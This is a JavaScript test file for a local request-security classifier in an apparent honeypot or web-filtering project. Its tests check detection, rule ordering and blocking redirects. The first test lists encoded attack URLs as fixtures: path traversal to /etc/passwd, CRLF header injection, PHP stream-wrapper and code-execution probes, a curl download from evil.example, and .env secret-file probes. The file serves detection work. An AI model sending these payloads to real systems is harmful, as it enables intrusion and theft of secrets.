import test from "node:test";
import assert from "node:assert/strict";
import { readFileSync } from "node:fs";
import {
  classifyLocalRequestThreat,
  localRequestSecurityEnabled,
  localRequestSecurityStats,
} from "../src/adaptive/local-request-security.js";
import productionEntry from "../src/v7-global-honeypot-entry.js";

const entry = readFileSync(
  new URL("../src/v7-global-honeypot-entry.js", import.meta.url),
  "utf8"
);
const intelligence = readFileSync(
  new URL("../src/adaptive/local-request-security.js", import.meta.url),
  "utf8"
);
const wrangler = readFileSync(
  new URL("../wrangler.jsonc", import.meta.url),
  "utf8"
);
const wranglerExample = readFileSync(
  new URL("../wrangler.example.jsonc", import.meta.url),
  "utf8"
);
const productionSmoke = readFileSync(
  new URL("../scripts/production-smoke.mjs", import.meta.url),
  "utf8"
);

test("encoded and double-encoded request-target attacks are classified locally", () => {
  const cases = [
    ["https://v7.example/?file=..%2F..%2Fetc%2Fpasswd", "path_traversal"],
    ["https://v7.example/?file=%252e%252e%252fetc%252fpasswd", "path_traversal"],
    ["https://v7.example/%2e%2e/etc/passwd", "path_traversal"],
    ["https://v7.example/%252e%252e%252fetc/passwd", "path_traversal"],
    ["https://v7.example/?name=test%00.php", "control_character_injection"],
    ["https://v7.example/?next=%0d%0aSet-Cookie%3Aadmin%3D1", "control_character_injection"],
    ["https://v7.example/?file=php%3A%2F%2Ffilter", "dangerous_stream_wrapper"],
    ["https://v7.example/?file=file%3A%2F%2Fetc%2Fpasswd", "dangerous_stream_wrapper"],
    ["https://v7.example/?x=auto_prepend_file%3Dphp%3A%2F%2Finput", "dangerous_stream_wrapper"],
    ["https://v7.example/?x=allow_url_include%3D1", "php_configuration_injection"],
    ["https://v7.example/?header=set-cookie%3Aadmin%3D1", "response_splitting_probe"],
    ["https://v7.example/?code=file_put_contents%28%27x.php%27%2C1%29", "php_code_execution_probe"],
    ["https://v7.example/?cmd=curl+https%3A%2F%2Fevil.example%2Fx", "command_download_probe"],
    ["https://v7.example/?target=secrets.json", "secret_file_query_probe"],
    ["https://v7.example/?target=.env", "secret_file_query_probe"],
  ];

  for (const [url, rule] of cases) {
    const result = classifyLocalRequestThreat(url);
    assert.equal(result.matched, true, url);
    assert.equal(result.rule, rule, url);
  }
});

test("ordinary navigation and search queries are not classified as attacks", () => {
  for (const url of [
    "https://v7.example/",
    "https://v7.example/search?q=hello+world",
    "https://v7.example/login?next=%2Faccount%2Fprofile",
    "https://v7.example/assets/app.js?v=20260830",
    "https://v7.example/download?asset=folder%2Fmanual.pdf",
    "https://v7.example/search?q=.environment+variables",
  ]) {
    assert.equal(classifyLocalRequestThreat(url).matched, false, url);
  }
});

test("request security is enabled by default, local and independently implemented", () => {
  assert.equal(localRequestSecurityEnabled({}), true);
  assert.equal(
    localRequestSecurityEnabled({ LOCAL_REQUEST_SECURITY_ENABLED: "false" }),
    false
  );

  const stats = localRequestSecurityStats();
  assert.equal(stats.ruleCategories, 8);
  assert.ok(stats.querySecretMarkers >= 10);
  assert.equal(stats.implementation, "independent_local");
  assert.equal(stats.runtimeExternalDependency, false);
  assert.doesNotMatch(intelligence, /\bfetch\s*\(/);
  assert.match(wrangler, /"LOCAL_REQUEST_SECURITY_ENABLED"\s*:\s*"true"/);
  assert.match(
    wranglerExample,
    /"LOCAL_REQUEST_SECURITY_ENABLED"\s*:\s*"true"/
  );
});

test("request-target protection runs before path, UA, ASN and AI policy", () => {
  const exactIndex = entry.indexOf("const blocked = await globalExactIpBlock");
  const requestIndex = entry.indexOf("const requestThreat = classifyLocalRequestThreat");
  const honeypotIndex = entry.indexOf("const match = classifyHoneypotPath");
  const uaIndex = entry.indexOf("const localBotIntel = classifyLocalStaticUa");
  const asnIndex = entry.indexOf("const communityIntel = await classifyCommunityAsn");

  assert.ok(exactIndex >= 0);
  assert.ok(requestIndex > exactIndex);
  assert.ok(honeypotIndex > requestIndex);
  assert.ok(uaIndex > honeypotIndex);
  assert.ok(asnIndex > uaIndex);
  assert.match(entry, /v7_local_request_security_raw_query_stored/);
  assert.match(entry, /v7_local_request_security_training_eligible/);
});

test("production wrapper enforces an encoded traversal immediately", async () => {
  const response = await productionEntry.fetch(
    new Request("https://v7.example/?file=%252e%252e%252fetc%252fpasswd", {
      headers: {
        "user-agent": "Mozilla/5.0",
        "cf-connecting-ip": "203.0.113.45",
      },
    }),
    {
      REDIRECT_ENFORCING: "true",
      BLOCK_URL: "https://blocked.example/",
    },
    {}
  );

  assert.equal(response.status, 302);
  assert.equal(response.headers.get("location"), "https://blocked.example/");
});

test("request security has its own kill switch independent of path honeypots", async () => {
  const attack = new Request("https://v7.example/?file=..%2Fetc%2Fpasswd", {
    headers: { "cf-connecting-ip": "203.0.113.46" },
  });
  const response = await productionEntry.fetch(
    attack,
    {
      HONEYPOT_ENFORCING: "false",
      LOCAL_REQUEST_SECURITY_ENABLED: "true",
      REDIRECT_ENFORCING: "true",
      BLOCK_URL: "https://blocked.example/",
    },
    {}
  );

  assert.equal(response.status, 302);
  assert.equal(response.headers.get("location"), "https://blocked.example/");
});

test("production smoke requires the deployed request security layer", () => {
  for (const field of [
    "v7_local_request_security_enabled",
    "v7_local_request_security_implementation",
    "v7_local_request_security_rule_categories",
    "v7_local_request_security_runtime_external_dependency",
    "v7_local_request_security_auto_blocks_exact_ip",
    "v7_local_request_security_raw_query_stored",
    "v7_local_request_security_training_eligible",
  ]) {
    assert.match(productionSmoke, new RegExp(field));
  }
});
